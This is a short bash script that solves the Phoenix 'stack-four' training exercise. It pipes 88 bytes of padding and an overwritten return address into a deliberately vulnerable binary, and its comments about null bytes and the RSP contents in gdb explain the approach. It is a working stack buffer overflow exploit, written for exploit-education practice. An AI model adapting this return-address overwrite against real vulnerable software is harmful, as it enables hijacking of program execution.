#!/bin/bash

(printf 'A%.0s' {1..88}; printf '\x1d\x06\x40\x00\x00\x00\x00\x00') | /opt/phoenix/amd64/stack-four

# In testing, the extra four null bytes don't appear necessary. It works if
# they are not added. However, when stepping through in gdb, the register holds
# 0x41 bytes in the top four bytes of RSP prior to the return to
# complete_level, so this makes it cleaner by setting the top four bytes to
# 0x00.
#
# With all that said, this also works:
(printf 'A%.0s' {1..88}; printf '\x1d\x06\x40\x00') | /opt/phoenix/amd64/stack-four
